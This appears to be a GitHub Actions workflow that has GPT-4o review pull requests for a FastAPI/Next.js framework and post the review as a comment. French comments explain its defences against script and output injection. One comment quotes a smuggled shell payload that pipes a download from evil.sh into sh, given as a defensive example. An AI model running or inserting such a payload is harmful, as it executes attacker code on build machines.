name: Agent — PR Reviewer (GitHub Models)

# AI agent that reviews pull requests using GitHub Models (free tier).
# Uses actions/ai-inference, no external API key required.
#
# Models: https://github.com/marketplace?type=models
# Free tier rate limits: https://docs.github.com/en/github-models/prototyping-with-ai-models#rate-limits

on:
  pull_request:
    types: [opened, synchronize, ready_for_review]

permissions:
  pull-requests: write
  contents: read
  issues: write
  models: read  # required for actions/ai-inference

jobs:
  review:
    name: GitHub Models PR review
    runs-on: ubuntu-latest
    if: |
      !github.event.pull_request.draft &&
      github.event.pull_request.head.repo.full_name == github.repository &&
      !contains(github.event.pull_request.labels.*.name, 'skip-review')
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      # Budget de requête : GitHub Models plafonne gpt-4o à 8000 tokens de corps de
      # requête (`413 Request body too large`). Un diff est dense (~3 caractères par
      # token) : les 30000 caractères d'origine pesaient ~10000 tokens à eux seuls, donc
      # le bot échouait sur TOUTE PR un peu grosse — silencieusement inutile là où il
      # servait le plus. Enveloppe visée ≈ 4800 tokens, avec de la marge.
      #
      # PR_BODY passe par l'ENV, jamais par une interpolation `${{ }}` dans le script :
      # un corps de PR contenant `"; curl evil.sh | sh #` serait sinon exécuté sur le
      # runner (script injection — le corps de PR est une entrée non fiable).
      - name: Compute diff
        id: diff
        env:
          PR_BODY: ${{ github.event.pull_request.body }}
          BASE_REF: ${{ github.event.pull_request.base.ref }}
        run: |
          git fetch origin "$BASE_REF"
          STAT=$(git diff "origin/$BASE_REF...HEAD" --stat | head -30)
          FULL=$(git diff "origin/$BASE_REF...HEAD" | head -c 10000)
          BODY=$(printf '%s' "$PR_BODY" | head -c 1500)
          # Délimiteur aléatoire, pas un mot fixe : STAT/FULL/BODY viennent du diff et
          # du corps de la PR, tous deux contrôlés par l'auteur (fork PR). Un délimiteur
          # constant permettrait d'injecter une ligne qui lui est identique dans le
          # diff/corps pour clore le bloc en avance et faire passer les lignes
          # suivantes pour de nouvelles affectations de sortie d'étape (output
          # injection). Générer un délimiteur imprévisible à chaque run neutralise
          # cette classe de bug. Ne pas revenir à un mot fixe pour "simplifier".
          DELIM="ghout_$(openssl rand -hex 16)"
          {
            echo "stat<<$DELIM"
            echo "$STAT"
            echo "$DELIM"
            echo "full<<$DELIM"
            echo "$FULL"
            echo "$DELIM"
            echo "body<<$DELIM"
            echo "$BODY"
            echo "$DELIM"
          } >> "$GITHUB_OUTPUT"

      - name: Run AI inference (GPT-4o)
        id: ai
        uses: actions/ai-inference@v1
        with:
          model: openai/gpt-4o
          max-tokens: 1500
          system-prompt: |
            You are a senior reviewer for the Facil Framework — a generic deployable platform for digital services (gov, enterprise, SaaS, banking) built on FastAPI + Next.js + Expo + Postgres+pgvector + Ollama. The framework is in pre-bootstrap state. Be constructive but rigorous.

            Output a markdown review with these sections only:

            ## Summary
            One paragraph.

            ## Risk
            🟢 Low / 🟡 Medium / 🔴 High — one line justification.

            ## Concerns
            Bullets per category (Security · Correctness · Performance · Architecture · Tests · Docs). Cite file:line. If none in a category, write "✅ none observed".

            ## Suggestions
            Specific code changes.

            ## Verdict
            ✅ Approve · 💬 Approve with comments · 🛑 Request changes

            Total under 600 words.
          prompt: |
            PR title: ${{ github.event.pull_request.title }}

            PR body:
            ${{ steps.diff.outputs.body }}

            Diff stat:
            ${{ steps.diff.outputs.stat }}

            Diff (truncated):
            ${{ steps.diff.outputs.full }}

      - name: Post review comment
        uses: actions/github-script@v7
        env:
          REVIEW: ${{ steps.ai.outputs.response }}
        with:
          script: |
            const review = process.env.REVIEW || '_AI inference returned empty._';
            const body = `<img src="https://raw.githubusercontent.com/${context.repo.owner}/${context.repo.repo}/main/.github/assets/icons/bot.svg" width="14" alt="bot"/> &nbsp;**PR Review** · GitHub Models · GPT-4o\n\n---\n\n${review}\n\n---\n_Auto-generated. Add label \`skip-review\` to opt out._`;
            await github.rest.issues.createComment({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.payload.pull_request.number,
              body,
            });
